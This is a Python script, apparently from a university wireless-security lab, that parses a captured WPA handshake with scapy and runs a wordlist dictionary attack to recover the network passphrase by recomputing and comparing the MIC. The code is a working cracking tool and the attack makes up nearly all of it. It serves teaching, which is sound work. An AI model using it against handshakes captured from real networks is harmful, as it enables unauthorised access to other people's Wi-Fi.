#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex, hexlify
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

class Target:
  def __init__(self, ap_mac, client_mac):
    self.ap_mac = ap_mac
    self.client_mac = client_mac
    self.ssid = None
    self.a_nonce = None
    self.s_nonce = None
    self.mic = None
    self.data = None

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

targets = dict()

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function

ssid        = "SWI"
APmac       = ""
Clientmac   = ""

# Authenticator and Supplicant Nonces
# todo: documenter
ANonce      = ""
# todo: documenter
SNonce      = ""

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
# todo: documenter
mic_to_test = ""

data = ""

emptyNONCE = b"0000000000000000000000000000000000000000000000000000000000000000"
emptyMIC = b"00000000000000000000000000000000"

for pkt in wpa:
    if pkt.haslayer(Dot11) and APmac == "":
        try:
            if pkt.info.decode('ascii') == ssid:
                APmac = pkt[Dot11].addr2.replace(":", "")
                print("Found SSID MAC", APmac)
        except Exception:
            pass
        
    if pkt.haslayer(EAPOL):
        src = pkt[Dot11].addr2.replace(":", "")
        dst = pkt[Dot11].addr1.replace(":", "")
        to_DS = pkt[Dot11].FCfield & 0x1 !=0
        from_DS = pkt[Dot11].FCfield & 0x2 !=0
        if from_DS == True and src == APmac:
            nonce = hexlify(pkt[Raw].load)[26:90]
            mic = hexlify(pkt[Raw].load)[154:186]
            if nonce != emptyNONCE and mic == emptyMIC:
                APmac = src; Clientmac = dst
                print("M1")
                ANonce = nonce
            elif src == APmac and dst == Clientmac and nonce != emptyNONCE and mic != emptyMIC:
                print("M3")
        elif to_DS == True and dst == APmac:
            nonce = hexlify(pkt[Raw].load)[26:90]
            mic = hexlify(pkt[Raw].load)[154:186]
            if src == Clientmac and dst == APmac and nonce != emptyNONCE and mic != emptyMIC:
                print("M2")
                SNonce = nonce
            elif src == Clientmac and dst == APmac and nonce == emptyNONCE and mic != emptyMIC:
                print("M4")
                mic_to_test = mic
                data = pkt.payload.payload.payload.payload.info[1:].replace(a2b_hex(mic), b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')

    elif pkt.haslayer(Dot11AssoReq):
        dst = ''.join('%02x' % b for b in raw(pkt)[18:24]) # the mac is broken here for some reason so we have to get it manualy
        src = ''.join('%02x' % b for b in raw(pkt)[24:30])
        to_DS = raw(pkt)[15] & 0x1 !=0
        if to_DS == True and dst == APmac:
            nonce = hexlify(pkt.payload.payload[2].info[18:18+32])
            mic = hexlify(pkt.payload.payload.payload.payload.info[82:82+16])
            if src == Clientmac and dst == APmac and nonce != emptyNONCE and mic != emptyMIC:
                print("M2")
                SNonce = nonce
            elif src == Clientmac and dst == APmac and nonce == emptyNONCE and mic != emptyMIC:
                print("M4")
                mic_to_test = a2b_hex(mic)
                data = pkt.payload.payload.payload.payload.info[1:].replace(mic_to_test, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')

print ("\n\nValues used to derivate keys")
print ("============================")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",APmac.encode(),"\n")
print ("Cient Mac: ",Clientmac.encode(),"\n")
print ("AP Nonce: ",ANonce,"\n")
print ("Client Nonce: ",SNonce,"\n")
print ("Mic: ",mic_to_test,"\n")

B = min(a2b_hex(APmac),a2b_hex(Clientmac))+max(a2b_hex(APmac),a2b_hex(Clientmac))+min(a2b_hex(ANonce),a2b_hex(SNonce))+max(a2b_hex(ANonce),a2b_hex(SNonce))

with open("wordlist.txt") as f:
    while(True):
        passPhrase  = f.readline()

        if passPhrase == "":
            break

        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(passPhrase)
        
        pmk = pbkdf2(hashlib.sha1,passPhrase,ssid.encode(), 4096, 32)

        #expand pmk to obtain PTK
        ptk = customPRF512(pmk,str.encode(A),B)

        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        mic = hmac.new(ptk[0:16],data,hashlib.sha1)


        print ("\nResults of the key expansion")
        print ("=============================")
        print ("Passphrase: ",passPhrase,"\n")
        print ("PMK:\t\t",pmk.hex(),"\n")
        print ("PTK:\t\t",ptk.hex(),"\n")
        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
        print ("TK:\t\t",ptk[32:48].hex(),"\n")
        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
        print ("MIC:\t\t",mic.digest()[:-4],"\n")
        print ("ORIG MIC:\t",mic_to_test,"\n")

        if mic_to_test == mic.digest()[:-4]:
            print("Found Passphrase: ", passPhrase.decode())
            exit(0)

print("Could not find passphrase")